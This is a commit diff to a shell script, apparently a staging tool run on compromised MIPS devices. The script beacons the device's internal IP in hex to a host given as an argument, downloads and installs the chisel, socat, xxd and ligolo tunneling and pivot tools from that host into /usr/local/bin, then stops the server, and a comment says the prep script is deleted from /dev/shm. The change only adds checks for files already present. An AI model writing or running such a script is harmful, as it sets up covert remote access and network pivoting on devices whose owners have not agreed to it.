check for files before retrieval

+++ srv/prep.sh
@@ -1,5 +1,7 @@
 #!/bin/sh
 
+##### BEGIN CONFIG #####
+
 FILEPATH=srv
 OUT_PATH=/usr/local/bin
 CHISEL_BIN=chisel-mips32
@@ -14,21 +16,35 @@ LIGOLO_OUT_BIN=ligolo
 
 PREP_SCRIPT=/dev/shm/prep.sh
 
+##### END CONFIG #####
+
 # Report back internal IP address of device in hex
 GET_INTERNAL_IP=$(ip a s eth0 | grep -i 'global' | cut -d ' ' -f6 | ${XXD_OUT_BIN} -p)
 curl -d 'ip':$(ip a s eth0 | grep -i 'global' | cut -d ' ' -f6 | ${XXD_OUT_BIN} -p) -H 'Content-Type: application/json' -X POST http://${1}:${2}/${GET_INTERNAL_IP}
 
 # Prepare file destination and transfer files
 mkdir -p ${OUT_PATH}
-curl http://${1}:${2}/${FILEPATH}/${CHISEL_BIN} -o ${OUT_PATH}/${CHISEL_OUT_BIN}
-curl http://${1}:${2}/${FILEPATH}/${SOCAT_BIN} -o ${OUT_PATH}/${SOCAT_OUT_BIN}
-curl http://${1}:${2}/${FILEPATH}/${XXD_BIN} -o ${OUT_PATH}/${XXD_OUT_BIN}
-curl http://${1}:${2}/${FILEPATH}/${LIGOLO_BIN} -o ${OUT_PATH}/${LIGOLO_OUT_BIN}
 
-chmod +x ${OUT_PATH}/${CHISEL_OUT_BIN}
-chmod +x ${OUT_PATH}/${SOCAT_OUT_BIN}
-chmod +x ${OUT_PATH}/${XXD_OUT_BIN}
-chmod +x ${OUT_PATH}/${LIGOLO_OUT_BIN}
+if ! test -f ${OUT_PATH}/${CHISEL_OUT_BIN}; then
+    curl http://${1}:${2}/${FILEPATH}/${CHISEL_BIN} -o ${OUT_PATH}/${CHISEL_OUT_BIN}
+    chmod +x ${OUT_PATH}/${CHISEL_OUT_BIN}
+fi
+
+if ! test -f ${OUT_PATH}/${SOCAT_OUT_BIN}; then
+    curl http://${1}:${2}/${FILEPATH}/${SOCAT_BIN} -o ${OUT_PATH}/${SOCAT_OUT_BIN}
+    chmod +x ${OUT_PATH}/${SOCAT_OUT_BIN}
+fi
+
+if ! test -f ${OUT_PATH}/${XXD_OUT_BIN}; then
+    curl http://${1}:${2}/${FILEPATH}/${XXD_BIN} -o ${OUT_PATH}/${XXD_OUT_BIN}
+    chmod +x ${OUT_PATH}/${XXD_OUT_BIN}
+fi
+
+if ! test -f ${OUT_PATH}/${LIGOLO_OUT_BIN}; then
+    curl http://${1}:${2}/${FILEPATH}/${LIGOLO_BIN} -o ${OUT_PATH}/${LIGOLO_OUT_BIN}
+    chmod +x ${OUT_PATH}/${LIGOLO_OUT_BIN}
+fi
+
 
 # Terminate web server and delete prep script
 curl -X QUIT http://${1}:${2}
